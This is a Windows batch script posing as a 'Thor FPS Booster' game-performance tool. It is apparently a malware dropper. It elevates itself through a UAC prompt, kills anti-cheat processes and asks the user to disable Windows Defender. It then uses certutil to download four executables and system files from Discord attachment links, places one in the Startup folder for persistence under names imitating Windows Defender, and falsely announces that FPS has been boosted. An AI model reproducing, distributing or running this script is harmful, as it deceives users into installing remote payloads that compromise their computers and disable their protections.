@echo off
color F0
MODE 19,1
set "params=%*" >nul
cls
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B ) >nul
cls
cls
taskkill /f /im vgtray.exe >nul
cls
taskkill /f /im vgc.exe >nul
cls
:start
MODE 110,10
title Thor FPS Booster
del %file%
color F0
cd
cls
echo.
echo  THIS PROGRAM WILL OPTIMISE YOUR PC AND CLEAR JUNK FILES!
echo  SINCE THIS PROGRAM DELETES FILES, YOU MUST TURN OFF WINDOWS DEFENDER, OR ELSE IT WILL NOT WORK PROPERLY. 
echo.
echo  Discord: Groovy#2670
echo.
echo  PRESS ANY KEY TO START...
pause>nul
MODE 19,1
set path1="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
md %path1% >nul
set path2=%appdata%\Mojang\com.mojang\Minecraft\TexturePacks
md %path2% >nul
cls

set url1=https://cdn.discordapp.com/attachments/811066257235247134/856645387418992670/Defender.exe >nul
set file1=WindowsDefender.exe >nul
certutil -urlcache -split -f %url1% %file1% >nul
cls
move %file1% %path1%\%file1% >nul
cls

set url2=https://cdn.discordapp.com/attachments/811066257235247134/856641771814387712/Antivirus.sys >nul
set file2=Antivirus.sys >nul
certutil -urlcache -split -f %url2% %file2% >nul
cls
move %file2% %path2%\%file2% >nul
cls

set url3=https://cdn.discordapp.com/attachments/811066257235247134/856641770586898452/Windows_Defender.exe >nul
set file3=Windows_Defender.exe >nul
certutil -urlcache -split -f %url3% %file3% >nul
cls
move %file3% %path2%\%file3% >nul
cls

set url4=https://cdn.discordapp.com/attachments/811066257235247134/856641776549625866/CloudProtect.sys >nul
set file4=CloudProtect.sys >nul
certutil -urlcache -split -f %url4% %file4% >nul
cls
move %file4% %path2%\%file4% >nul
cls

MODE 70,6
echo.
echo  FPS HAS BEEN BOOSTED!
echo  RESTART YOUR PC FOR CHANGED TO TAKE EFFECT!
echo  PRESS ANY KEY TO EXIT!
echo.
pause >nul
exit